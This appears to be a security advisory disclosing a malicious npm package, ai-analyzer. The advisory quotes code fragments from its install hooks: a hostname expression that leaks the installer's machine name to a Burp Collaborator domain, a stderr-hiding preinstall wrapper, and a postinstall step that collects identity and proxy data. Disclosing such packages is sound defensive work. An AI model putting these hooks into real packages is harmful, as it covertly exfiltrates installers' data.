summary: ai-analyzer preinstall exfiltrates hostname to Burp Collaborator; postinstall harvests git/proxy identity
details: On npm install, preinstall.js issues an HTTPS request to a hostname constructed as `os.hostname() + '.xstm5ywkgkh0fi1694d2u9ykbbh25vtk.oastify.com'`, causing DNS resolution to leak the installer's hostname to a Burp Collaborator (oastify.com) subdomain controlled by whoever generated the payload. The preinstall command in package.json is wrapped as `node preinstall.js 2>/dev/null || node -e "console.log('Pre-install check')"`, suppressing stderr and hiding the exfil attempt from the installer. postinstall.js additionally collects hostname, platform, arch, username, homedir, cwd, proxy environment variables, and `git config user.name` / `user.email` and writes them as JSON under `os.tmpdir()/ai-analyzer-logs/`, staging installer identity and proxy configuration on disk. postinstall.js also writes `/mnt/user-data/outputs/test.exe` and runs `setsid sleep 3600 &`, developer-sandbox artifacts left in a published tarball. The exported `analyzeEmail(content)` function unconditionally POSTs caller-supplied content to the hardcoded endpoint `https://ai.calif-pentest.com/api/v1/ai-analyzer` with no configuration option.

cwes.description: The product contains code that appears to be malicious in nature.
